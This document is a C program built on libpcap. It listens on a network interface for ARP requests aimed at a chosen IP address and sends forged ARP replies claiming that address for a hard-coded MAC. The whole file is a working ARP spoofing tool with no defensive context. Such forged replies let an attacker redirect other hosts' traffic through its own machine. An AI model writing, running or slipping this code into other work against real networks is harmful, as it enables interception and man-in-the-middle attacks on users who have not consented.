#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <pcap.h>
#include <arpa/inet.h>
#include <netinet/in.h>
#include <net/ethernet.h>
#include <net/if_arp.h>  // ADDED: Needed for ARP constants like ARPOP_REQUEST, ARPOP_REPLY, ARPHRD_ETHER

// Minimum Ethernet frame size (60 bytes)
#define ETH_MIN_LEN 60

// Ethernet header structure
struct eth_hdr {
    u_char dest[6];
    u_char src[6];
    u_short ethertype;
} __attribute__((packed));

// ARP header structure
struct arp_hdr {
    u_short htype;
    u_short ptype;
    u_char hlen;
    u_char plen;
    u_short opcode;
    u_char sender_mac[6];
    u_int sender_ip;
    u_char target_mac[6];
    u_int target_ip;
} __attribute__((packed));

// Combined ARP packet (Ethernet + ARP)
struct arp_packet {
    struct eth_hdr eth;
    struct arp_hdr arp;
} __attribute__((packed));

// Global variables (customize as needed)
pcap_t *handle;
u_int spoof_ip;               // The IP address for which we want to answer ARP (in network byte order)
u_char spoof_mac[6] = {0x00, 0x0c, 0x87, 0x47, 0x50, 0x27}; // Hard-coded MAC for spoofing

// Packet handler function
void packet_handler(u_char *args, const struct pcap_pkthdr *header, const u_char *packet) {
    (void)args; // unused parameter

    // Check that this is an ARP packet
    struct eth_hdr *eth = (struct eth_hdr *)packet;
    if (ntohs(eth->ethertype) != ETHERTYPE_ARP)
        return;

    // Get the ARP header
    struct arp_hdr *arp = (struct arp_hdr *)(packet + sizeof(struct eth_hdr));

    // Only process ARP requests for our spoof_ip
    if (ntohs(arp->opcode) != ARPOP_REQUEST)
        return;
    if (arp->target_ip != spoof_ip)
        return;

    // Build the ARP reply
    struct arp_packet reply;
    // Ethernet header: reply's destination is the original sender, source is our spoof_mac.
    memcpy(reply.eth.dest, eth->src, 6);
    memcpy(reply.eth.src, spoof_mac, 6);
    reply.eth.ethertype = htons(ETHERTYPE_ARP);

    // ARP header: reply opcode, hardware and protocol types/lengths.
    reply.arp.htype = htons(ARPHRD_ETHER);
    reply.arp.ptype = htons(ETHERTYPE_IP);
    reply.arp.hlen = ETHER_ADDR_LEN;
    reply.arp.plen = sizeof(struct in_addr);
    reply.arp.opcode = htons(ARPOP_REPLY);

    // In the reply, our spoof MAC and IP become the sender info.
    memcpy(reply.arp.sender_mac, spoof_mac, 6);
    reply.arp.sender_ip = spoof_ip;

    // The target is the original sender.
    memcpy(reply.arp.target_mac, arp->sender_mac, 6);
    reply.arp.target_ip = arp->sender_ip;

    // Determine reply length and pad if necessary.
    int reply_len = sizeof(reply);
    u_char buffer[ETH_MIN_LEN];
    memset(buffer, 0, ETH_MIN_LEN);
    memcpy(buffer, &reply, reply_len);
    
    if (pcap_sendpacket(handle, buffer, ETH_MIN_LEN) == -1) {
        fprintf(stderr, "Error sending packet: %s\n", pcap_geterr(handle));
    } else {
        struct in_addr addr;
        addr.s_addr = spoof_ip;
        printf("Sent ARP reply for %s\n", inet_ntoa(addr));
    }
}

int main(int argc, char *argv[]) {
    if (argc != 3) {
        fprintf(stderr, "Usage: %s <interface> <spoof_ip>\n", argv[0]);
        exit(EXIT_FAILURE);
    }
    char *dev = argv[1];
    char errbuf[PCAP_ERRBUF_SIZE];
    spoof_ip = inet_addr(argv[2]);

    // Open the device for capturing (promiscuous mode enabled)
    handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
    if (handle == NULL) {
        fprintf(stderr, "Could not open device %s: %s\n", dev, errbuf);
        exit(EXIT_FAILURE);
    }

    printf("Listening on %s for ARP requests to %s\n", dev, argv[2]);
    printf("Spoofing MAC: %02x:%02x:%02x:%02x:%02x:%02x\n",
           spoof_mac[0], spoof_mac[1], spoof_mac[2],
           spoof_mac[3], spoof_mac[4], spoof_mac[5]);

    // Start capture loop
    pcap_loop(handle, -1, packet_handler, NULL);
    pcap_close(handle);
    return 0;
}
